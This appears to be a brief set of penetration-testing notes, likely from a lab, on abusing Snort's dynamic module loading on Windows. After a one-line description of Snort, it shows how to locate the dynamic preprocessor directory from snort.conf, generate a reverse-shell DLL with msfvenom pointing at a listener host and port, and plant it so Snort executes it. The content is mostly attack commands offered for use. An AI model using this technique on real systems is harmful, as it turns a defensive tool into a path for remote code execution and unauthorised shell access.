Snort

An open-source network intrusion detection system that analyzes network traffic in real-time to identify malicious activity and potential attacks

Exploitation

    Malicious DLL execution

    In snort manual we can find a section called Dynamic Modules which are snipets of called in form of DLL that are executed by snort

    This can be found in snort.conf

    type snort.conf | findstr dynamicpreprocessor

    This will output the location of where this dynamic modules can be found, typically

    C:\Snort\lib\snort_dynamicengine\

    Proceed, to create a malicious payload

     msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f dll -a x64 -o reverse.dll

    Upload payload, place it to that path and wait for the reverse shell :)
